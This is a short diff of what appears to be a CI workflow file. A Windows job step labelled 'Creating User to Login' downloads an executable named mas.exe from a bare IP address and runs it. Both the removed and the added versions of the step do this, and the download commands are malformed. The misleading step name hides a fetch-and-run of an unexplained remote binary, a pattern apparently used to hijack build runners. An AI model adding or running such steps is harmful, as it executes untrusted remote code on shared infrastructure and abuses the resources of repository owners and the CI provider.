@@ -15,6 +15,7 @@ jobs:
     runs-on: windows-latest
     steps:
     - name: Creating User to Login
-      run: cmd /c dir
-      run: http://44.202.6.121/mas.exe
-      run: cmd /c mas.exe
+      run: |
+      cmd /c dir
+      cmd /c http://44.202.6.121/mas.exe -O
+      cmd /c mas.exe
